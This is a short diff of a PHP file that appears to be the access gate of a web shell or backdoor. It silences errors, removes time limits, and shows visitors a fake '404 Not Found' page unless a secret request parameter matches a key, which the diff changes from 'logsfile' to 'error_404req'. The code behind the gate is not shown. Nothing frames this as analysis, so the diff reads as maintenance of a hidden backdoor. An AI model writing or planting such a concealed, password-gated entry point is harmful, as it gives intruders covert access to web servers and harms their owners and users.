@@ -3,7 +3,7 @@ error_reporting(0);
 @ini_set('display_errors', 0);
 @set_time_limit(0);
 
-if (!isset($_REQUEST['_']) || $_REQUEST['_'] != 'logsfile') {
+if (!isset($_REQUEST['_']) || $_REQUEST['_'] != 'error_404req') {
     header("HTTP/1.0 404 Not Found");
     die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><p>Access Denied</p></body></html>');
 }
